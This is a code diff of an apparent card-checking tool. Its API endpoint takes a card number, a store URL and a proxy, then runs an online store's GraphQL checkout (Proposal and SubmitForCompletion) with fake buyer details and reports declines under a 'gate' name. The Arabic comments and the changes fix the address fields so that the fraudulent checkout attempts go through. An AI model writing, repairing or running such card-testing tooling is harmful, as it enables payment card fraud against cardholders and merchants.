@@ -22,7 +22,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python X-Ray V2"):
+def safe_response(msg, raw_data, price, gate="X-Ray Pro"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -137,16 +137,27 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             card_session_id = res_pci.json().get("id")
 
             # =========================================================
-            # التعديل النهائي الصارم (إضافة streetAddress المفقودة)
+            # التعديل التقني الجذري لتخطي خطأ الـ Proposal
             # =========================================================
-            flat_address = {
-                "address1": buyer["address1"], 
-                "city": buyer["city"], 
-                "countryCode": buyer["country"], 
-                "firstName": buyer["first_name"], 
-                "lastName": buyer["last_name"], 
+            
+            # 1. العنوان الجغرافي فقط (بدون أسماء)
+            geo_address = {
+                "address1": buyer["address1"],
+                "city": buyer["city"],
+                "countryCode": buyer["country"],
+                "postalCode": buyer["zip"],
+                "zoneCode": buyer["province"]
+            }
+
+            # 2. العنوان الكامل للدفع
+            full_address = {
+                "address1": buyer["address1"],
+                "city": buyer["city"],
+                "countryCode": buyer["country"],
+                "firstName": buyer["first_name"],
+                "lastName": buyer["last_name"],
                 "phone": buyer["phone"],
-                "postalCode": buyer["zip"], 
+                "postalCode": buyer["zip"],
                 "zoneCode": buyer["province"]
             }
 
@@ -158,10 +169,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             merch_id = str(uuid.uuid4())
             
             prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
+            
             prop_vars = {
                 "delivery": {
                     "deliveryLines": [{
-                        "destination": {"streetAddress": flat_address}, # <-- هنا تم التصحيح الجذري للخطأ
+                        "destination": {"partialStreetAddress": geo_address}, # <-- تم تصحيح الصيغة هنا لـ partialStreetAddress
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"],
                         "destinationChanged": True,
@@ -172,8 +184,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 },
                 "payment": {
                     "totalAmount": {"any": True},
-                    "paymentLines": [],
-                    "billingAddress": {"streetAddress": flat_address}
+                    "paymentLines": []
                 },
                 "merchandise": {
                     "merchandiseLines": [{
@@ -201,6 +212,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
+            
             sub_vars = {
                 "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                 "input": {
@@ -208,7 +220,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     "queueToken": queue_token,
                     "delivery": {
                         "deliveryLines": [{
-                            "destination": {"streetAddress": flat_address},
+                            "destination": {"streetAddress": full_address}, # <-- وتم تصحيح الصيغة هنا لـ streetAddress
                             "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                             "deliveryMethodTypes": ["SHIPPING"],
                             "destinationChanged": False,
@@ -225,12 +237,12 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                 "directPaymentMethod": {
                                     "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                                     "sessionId": card_session_id,
-                                    "billingAddress": {"streetAddress": flat_address}
+                                    "billingAddress": {"streetAddress": full_address}
                                 }
                             },
                             "amount": {"any": True}
                         }],
-                        "billingAddress": {"streetAddress": flat_address}
+                        "billingAddress": {"streetAddress": full_address}
                     },
                     "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                 }
